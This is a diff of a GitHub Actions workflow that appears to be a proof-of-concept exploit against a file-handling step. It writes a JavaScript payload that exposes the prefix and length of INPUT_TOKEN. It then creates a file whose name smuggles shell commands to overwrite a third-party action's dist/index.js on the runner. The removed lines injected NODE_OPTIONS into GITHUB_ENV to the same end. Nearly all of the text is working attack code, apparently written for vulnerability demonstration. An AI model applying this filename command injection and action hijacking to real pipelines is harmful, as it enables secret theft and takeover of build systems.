@@ -11,12 +11,11 @@ jobs:
         run: |
           set -e
           mkdir -p content
-          printf 'hello\n' > content/report.txt
-          cat > content/evil.txt <<'EOF'
-          const t=process.env.INPUT_TOKEN||'';
-          throw new Error('GAB_INPUT_TOKEN len='+t.length+' prefix='+t.slice(0,4));
+          cat > content/payload.js <<'EOF'
+          const t = process.env.INPUT_TOKEN || '';
+          throw new Error('GAB_INPUT_TOKEN len=' + t.length + ' prefix=' + t.slice(0,4));
           EOF
-          printf 'x\n' > "content/report.txt;P=\$(printf %.1s \$PATH);cd \${P}tmp;cd content;cd content-poc;cp evil.txt \${P}tmp\${P}evil.js;sed -i 1iNODE_OPTIONS=--require=\${P}tmp\${P}evil.js \$GITHUB_ENV;true;#.txt"
+          printf 'x\n' > "content/report.txt;P=\$(printf %.1s \$PATH);cd \${P}tmp;cd content;cd content-poc;cp payload.js \${P}home\${P}runner\${P}work\${P}_actions\${P}peter-evans\${P}commit-comment\${P}v3\${P}dist\${P}index.js;true;#.txt"
       - uses: actions/upload-artifact@v4
         with:
           name: content-poc
